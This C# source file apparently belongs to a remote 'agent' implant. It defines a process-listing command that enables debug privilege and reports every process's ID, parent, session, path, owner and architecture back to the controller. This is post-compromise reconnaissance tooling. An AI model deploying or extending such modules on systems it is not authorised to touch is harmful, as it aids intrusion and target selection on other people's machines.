using Shared;
using Shared.ResultObjects;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ListProcessCommand : AgentCommand
    {
        public override CommandId Command => CommandId.ListProcess;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            var list = new List<ListProcessResult>();
            string filter = null;
            if (task.HasParameter(ParameterId.Path))
                filter = task.GetParameter<string>(ParameterId.Path); ;

            WinAPI.APIWrapper.EnableDebugPrivilege();

            var processes = WinAPI.APIWrapper.GetProcessList(filter);

            foreach (var p in processes)
            {
               
                if (p.ProcessId != IntPtr.Zero)
                {
                    var res = new ListProcessResult()
                    {
                        Name = p.ProcessName,
                        Id = (int)p.ProcessId,
                        ParentId = (int)p.ParentId,
                        SessionId = p.SessionId,
                        ProcessPath = p.ImagePath,
                        Owner = p.Owner,
                        Arch = p.Architecture,
                    };
                    list.Add(res);
                }
            }

            context.Objects(list);
        }


    }
}
